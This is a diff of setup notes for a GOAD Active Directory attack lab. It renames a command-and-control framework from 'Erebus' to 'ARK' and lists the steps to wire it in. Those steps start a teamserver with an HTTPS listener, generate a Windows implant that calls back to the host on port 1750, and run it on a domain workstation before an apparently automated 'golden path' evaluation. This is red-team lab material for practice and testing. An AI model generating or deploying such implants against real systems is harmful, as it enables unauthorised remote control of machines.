@@ -1,4 +1,4 @@
-# GOAD Lab Setup (Erebus host notes)
+# GOAD Lab Setup (ARK host notes)
 
 **Clone location:** `/home/zero/labs/GOAD`  
 **Preferred lab:** **MINILAB** (2 VMs) or **GOAD-Light** (3 VMs) — full GOAD needs more RAM.  
@@ -75,18 +75,18 @@ Typical GOAD-Light names (for reference when using Light instead of Mini):
 
 ---
 
-## Erebus wiring (after VMs up)
+## ARK wiring (after VMs up)
 
 1. Note host IP reachable from lab network (often `192.168.56.1` for host-only).  
-2. `erebus teamserver` with HTTPS listener on that interface.  
-3. `generate --os windows --sleep 500 --callback https://<HOST_IP>:443 --out implant.exe`  
+2. `ark teamserver` with HTTPS listener on that interface (fresh default **1750**; many labs still use 8443).  
+3. `generate --os windows --language c --sleep 500 --callback https://<HOST_IP>:1750 --out implant.exe`  
 4. Run implant on domain workstation.  
 5. Manual path from `docs/GOLDEN_DEMO.md`.  
 6. Log 5× Auto in `scripts/golden_ad_eval.md`.
 
 ---
 
-## Erebus golden path against GOAD
+## ARK golden path against GOAD
 
 Frozen objective (unchanged):
 
